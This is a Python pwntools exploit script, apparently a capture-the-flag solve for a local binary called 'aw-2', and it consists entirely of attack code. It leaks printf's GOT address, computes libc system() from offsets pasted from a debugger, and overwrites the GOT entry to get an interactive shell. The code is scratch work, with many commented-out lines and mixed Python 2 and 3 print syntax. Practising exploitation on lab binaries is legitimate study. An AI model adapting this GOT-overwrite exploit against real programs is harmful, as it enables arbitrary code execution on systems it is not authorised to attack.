#!/usr/bin/env python

from pwn import *
import os

p = process("./aw-2")

printf_got = p.elf.got['printf']
print(hex(printf_got))

print(p.recvrepeat(0.01))
#print(p.recvline())
length = 8
#p.sendline(str(length))
p.sendline('8')
print(length)

#print(p.recvline())
print(p.recvrepeat(0.01))
p.sendline(hex(printf_got))
print(hex(printf_got))

p.recvline()
data = p.recv()
print(repr(data))
values = data.split(' ')
value = data.split('T')
#val = (pack(value[0],'all',endian='little', sign=True))
#print(val[0])
"""
$1 = {<text variable, no debug info>} 0x7fcc2fbab390 <__libc_system>
pwndbg> p printf
$2 = {<text variable, no debug info>} 0x7fcc2fbbb800 <__printf>
$1 = {<text variable, no debug info>} 0x7fa17803d390 <__libc_system>
pwndbg> p puts
$2 = {<text variable, no debug info>} 0x7fa178067690 <_IO_puts>
"""
sys = u64(value[0]) - 0x7fcc2fbbb800 + 0x7fcc2fbab390
#sys = u64(value[0]) - 0x7fa178067690 + 0x7fa17803d390
#print(hex(u64(value[0])))
#print(hex(sys))

#p.sendline(str(length))
#print(length)
#print "3", p.recvline()
p.sendline('8')
print(length)


#print(p.recvrepeat(0.01))
print "4", p.recvline()
#addr_printf_got = 0x602028

p.sendline(hex(printf_got))
#p.sendline(hex(u64(value[0])))
#print(hex(u64(value[0])))
#p.sendline(

print(hex(printf_got))
#p.sendline(value[0])
#print(value[0])
#print(p.recvline())

#p.recvrepeat(0.01)
print(p.recvrepeat(0.10))
p.sendline(p64(sys))
print(hex(sys))
#print(sys)
p.interactive()
